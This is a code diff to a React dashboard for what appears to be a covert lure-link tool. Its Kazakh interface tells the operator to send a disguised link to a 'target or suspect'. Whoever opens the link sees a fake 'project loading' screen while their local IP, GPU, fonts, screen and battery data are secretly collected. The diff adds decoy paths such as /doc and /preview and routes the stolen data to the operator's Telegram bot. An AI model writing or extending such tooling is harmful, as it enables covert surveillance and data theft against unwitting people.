@@ -38,10 +38,12 @@ export function Component(): React.ReactElement {
   const [copiedLure, setCopiedLure] = useState(false)
   const [capturedLogs, setCapturedLogs] = useState<any[]>([])
 
-  const lureUrl =
-    typeof window !== 'undefined'
-      ? `${window.location.origin}/lure`
-      : 'https://qarmaq.vercel.app/lure'
+  const [lurePath, setLurePath] = useState('/preview')
+  const host =
+    typeof window !== 'undefined' && !window.location.origin.includes('localhost')
+      ? window.location.origin
+      : 'https://sitequr.vercel.app'
+  const lureUrl = `${host}${lurePath}`
 
   const loadCapturedLogs = () => {
     try {
@@ -225,10 +227,38 @@ export function Component(): React.ReactElement {
         <h3 className={styles.lureTitle}>Нысанаға немесе күдікті адамға жіберетін қармақ сілтемесі</h3>
         <p className={styles.lureDesc}>
           Төмендегі сілтемені көшіріп, нысанаға жіберіңіз. Ол сілтемені ашқан сәтте
-          «Құжат ашылуда…» деген алдамшы экранды көреді, ал оның барлық Group A
+          «SiteQur — Жоба жүктелуде…» деген алдамшы экранды көреді, ал оның барлық Group A
           деректері (Local IP, GPU, қаріптер, экран, батарея) жасырын сканерленіп,
-          төмендегі журналға түседі!
+          тікелей Telegram ботыңызға жіберіледі!
         </p>
+
+        <div style={{ display: 'flex', gap: '8px', marginBottom: '12px', flexWrap: 'wrap' }}>
+          {[
+            { path: '/preview', label: '🌐 /preview (Сайт үлгісі)' },
+            { path: '/doc', label: '📄 /doc (Құжат)' },
+            { path: '/project', label: '💼 /project (Жоба)' },
+            { path: '/view', label: '👁️ /view (Қарау)' },
+          ].map((item) => (
+            <button
+              key={item.path}
+              type="button"
+              onClick={() => setLurePath(item.path)}
+              style={{
+                padding: '4px 10px',
+                fontSize: '12px',
+                borderRadius: '6px',
+                cursor: 'pointer',
+                background: lurePath === item.path ? '#0df2c9' : 'rgba(255,255,255,0.06)',
+                color: lurePath === item.path ? '#050709' : '#a1a7b4',
+                border: lurePath === item.path ? '1px solid #0df2c9' : '1px solid rgba(255,255,255,0.1)',
+                fontWeight: lurePath === item.path ? 600 : 400,
+                transition: 'all 0.15s ease',
+              }}
+            >
+              {item.label}
+            </button>
+          ))}
+        </div>
         <div className={styles.lureLinkBar}>
           <code className={styles.lureUrl}>{lureUrl}</code>
           <Button onClick={handleCopyLureUrl} size="sm" variant="alarm">
